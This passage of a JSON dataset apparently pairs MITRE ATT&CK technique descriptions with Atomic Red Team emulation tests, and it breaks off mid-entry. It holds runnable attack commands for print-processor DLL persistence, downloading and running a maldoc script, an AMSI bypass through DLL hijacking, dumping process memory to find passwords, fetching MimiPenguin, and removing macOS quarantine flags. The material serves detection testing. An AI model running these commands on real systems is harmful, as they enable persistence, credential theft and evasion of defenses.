based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n", "supported_platforms": ["windows"], "input_arguments": {"restart": {"description": "set to 1 if you want the computer to reboot as part of the test", "type": "integer", "default": 0}}, "executor": {"command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f\nnet start spooler\nif(#{restart}){\n  Restart-Computer\n}\n", "cleanup_command": "net stop spooler\nrm -force C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll -ErrorAction SilentlyContinue\nrm -force C:\\Users\\Public\\AtomicTest.txt -ErrorAction SilentlyContinue\nremove-item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" -Force -ErrorAction SilentlyContinue\nnet start spooler\n", "name": "powershell", "elevation_required": true}}]}, "T1566.001": {"name": "Spearphishing Attachment", "technique_id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597", "external_id": "T1566.001", "data_components": ["Network Traffic Flow", "Application Log Content", "File Creation", "Network Traffic Content"], "kill_chain_phases": ["initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ", "atomic_tests": [{"name": "Download Macro-Enabled Phishing Attachment", "auto_generated_guid": "114ccff9-ae6d-4547-9ead-4cd69f687306", "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n", "supported_platforms": ["windows"], "executor": {"command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n", "name": "powershell", "cleanup_command": "Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore\n"}}, {"name": "Word spawned a command shell and used an IP address in the command line", "auto_generated_guid": "cbb6799a-425c-4f83-9194-5447a909d67f", "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n", "supported_platforms": ["windows"], "input_arguments": {"jse_path": {"description": "Path for the macro to write out the \"malicious\" .jse file\n", "type": "string", "default": "C:\\Users\\Public\\art.jse"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1574.001": {"name": "DLL Search Order Hijacking", "technique_id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34", "external_id": "T1574.001", "data_components": ["File Modification", "Module Load", "File Creation"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e8242a33-481c-4891-af63-4cf3e4cf6aff"], "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.", "atomic_tests": [{"name": "DLL Search Order Hijacking - amsi.dll", "auto_generated_guid": "8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3", "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n", "supported_platforms": ["windows"], "executor": {"command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "cleanup_command": "del %APPDATA%\\updater.exe >nul 2>&1\ndel %APPDATA%\\amsi.dll >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1119": {"name": "Automated Collection", "technique_id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619", "external_id": "T1119", "data_components": ["Script Execution", "Command Execution", "File Access"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.", "atomic_tests": [{"name": "Automated Collection Command Prompt", "auto_generated_guid": "cb379146-53f1-43e0-b884-7ce2c635ff5b", "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection\n", "cleanup_command": "del %temp%\\T1119_command_prompt_collection /F /Q >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Automated Collection PowerShell", "auto_generated_guid": "634bd9b9-dc83-4229-b19f-7f83ba9ad313", "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n", "cleanup_command": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null\n", "name": "powershell"}}, {"name": "Recon information for export with PowerShell", "auto_generated_guid": "c3f6d794-50dd-482f-b640-0384fbb7db26", "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "cleanup_command": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Recon information for export with Command Prompt", "auto_generated_guid": "aa1180e2-f329-4e1e-8625-2472ec0bfaf3", "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "cleanup_command": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1\n", "name": "command_prompt"}}]}, "T1115": {"name": "Clipboard Data", "technique_id": "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f", "external_id": "T1115", "data_components": ["OS API Execution", "Command Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)", "atomic_tests": [{"name": "Utilize Clipboard to store or execute commands from", "auto_generated_guid": "0cd14633-58d4-4422-9ede-daa2c9474ae7", "description": "Add data to clipboard to copy off or execute commands from.\n", "supported_platforms": ["windows"], "executor": {"command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "cleanup_command": "del %temp%\\T1115.txt >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Execute Commands from Clipboard using PowerShell", "auto_generated_guid": "d6dc21af-bec9-4152-be86-326b6babd416", "description": "Utilize PowerShell to echo a command to clipboard and execute it\n", "supported_platforms": ["windows"], "executor": {"command": "echo Get-Process | clip\nGet-Clipboard | iex\n", "name": "powershell"}}, {"name": "Execute commands from clipboard", "auto_generated_guid": "1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff", "description": "Echo a command to clipboard and execute it", "supported_platforms": ["macos"], "executor": {"command": "echo ifconfig | pbcopy\n$(pbpaste)", "name": "bash"}}, {"name": "Collect Clipboard Data via VBA", "auto_generated_guid": "9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52", "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n", "supported_platforms": ["windows"], "input_arguments": {"ms_product": {"description": "Maldoc application Word", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n", "cleanup_command": "Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Add or copy content to clipboard with xClip", "auto_generated_guid": "ee363e53-b083-4230-aff3-f8d955f2d5bb", "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n", "supported_platforms": ["linux"], "executor": {"command": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n", "name": "sh"}}]}, "T1003.007": {"name": "Proc Filesystem", "technique_id": "attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d", "external_id": "T1003.007", "data_components": ["Command Execution", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.", "atomic_tests": [{"name": "Dump individual process memory with sh (Local)", "auto_generated_guid": "7e91138a-8e74-456d-a007-973d67a0bb80", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.007.bin"}, "script_path": {"description": "Path to script generating the target process", "type": "path", "default": "/tmp/T1003.007.sh"}, "pid_term": {"description": "Unique string to use to identify target process", "type": "string", "default": "T1003.007"}}, "dependencies": [{"description": "Script to launch target process must exist\n", "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n", "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n", "cleanup_command": "rm -f \"#{output_file}\"\n"}}, {"name": "Dump individual process memory with sh on FreeBSD (Local)", "auto_generated_guid": "fa37b633-e097-4415-b2b8-c5bf4c86e423", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.007.bin"}, "script_path": {"description": "Path to script generating the target process", "type": "path", "default": "/tmp/T1003.007.sh"}, "pid_term": {"description": "Unique string to use to identify target process", "type": "string", "default": "T1003.007"}}, "dependencies": [{"description": "Script to launch target process must exist\n", "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n", "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"#{output_file}\" | grep -i PASS\n", "cleanup_command": "rm -f \"#{output_file}\"\n"}}, {"name": "Dump individual process memory with Python (Local)", "auto_generated_guid": "437b2003-a20d-4ed8-834c-4964f24eec63", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.007.bin"}, "script_path": {"description": "Path to script generating the target process", "type": "path", "default": "/tmp/T1003.007.sh"}, "python_script": {"description": "Path to script generating the target process", "type": "path", "default": "PathToAtomicsFolder/T1003.007/src/dump_heap.py"}, "pid_term": {"description": "Unique string to use to identify target process", "type": "string", "default": "T1003.007"}}, "dependencies": [{"description": "Script to launch target process must exist\n", "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n", "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"}, {"description": "Requires Python\n", "prereq_command": "(which python || which python3 || which python2)\n", "get_prereq_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n", "cleanup_command": "rm -f \"#{output_file}\"\n"}}, {"name": "Capture Passwords with MimiPenguin", "auto_generated_guid": "a27418de-bdce-4ebd-b655-38f04842bf0c", "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.007Test3.txt"}, "MimiPenguin_Location": {"description": "Path of MimiPenguin script", "type": "path", "default": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n", "prereq_command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n"}, {"description": "Strings must be installed\n", "prereq_command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo apt-get -y install binutils\n"}, {"description": "Python2 must be installed\n", "prereq_command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo apt-get -y install python2       \n"}, {"description": "Libc-bin must be installed\n", "prereq_command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo apt-get -y install libc-bin        \n"}], "executor": {"command": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file} > /dev/null\n", "name": "bash", "elevation_required": true}}]}, "T1553.001": {"name": "Gatekeeper Bypass", "technique_id": "attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e", "external_id": "T1553.001", "data_components": ["File Metadata", "File Modification", "Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).", "atomic_tests": [{"name": "Gatekeeper Bypass", "auto_generated_guid": "fb3d46c6-9480-4803-8d7d-ce676e1f1a9b", "description": "Gatekeeper Bypass via command line\n", "supported_platforms": ["macos"], "input_arguments": {"app_path": {"description": "Path to app to be used", "type": "path", "default": "myapp.app"}}, "executor": {"command": "sudo xattr -d com.apple.quarantine #{app_path}\n", "elevation_required": true, "name": "sh"}}]}, "T1007": {"name": "System Service Discovery", "technique_id": "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa", "external_id": "T1007", "data_components": ["OS API Execution", "Command Execution", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "atomic_tests": [{"name": "System Service Discovery", "auto_generated_guid": "89676ba1-b1f8-47ee-b940-2e1a113ebc71", "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "tasklist.exe\nsc query\nsc query state= all\n", "name": "command_prompt", "elevation_required": true}}, {"name": "System Service Discovery - net.exe", "auto_generated_guid": "5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3", "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path of file to hold net.exe output", "type": "path", "default": "%temp%\\service-list.txt"}}, "executor": {"command": "net.exe start >> #{output_file}\n", "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "System Service Discovery - systemctl", "auto_generated_guid": "f4b26bce-4c2c-46c0-bcc5-fce062d38bef", "description": "Enumerates system service using systemctl\n", "supported_platforms": ["linux"], "executor": {"command": "systemctl --type=service\n", "name": "bash"}}, {"name": "System Service Discovery - service", "auto_generated_guid": "b2e1c734-7336-40f9-b970-b04731cbaf8a", "description": "Enumerates system service using service\n", "supported_platforms": ["linux"], "executor": {"command": "service -e\n", "name": "sh"}}]}, "T1040": {"name": "Network Sniffing", "technique_id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529", "external_id": "T1040", "data_components": ["Command Execution", "Process Creation"], "kill_chain_phases": ["credential-access", "discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this 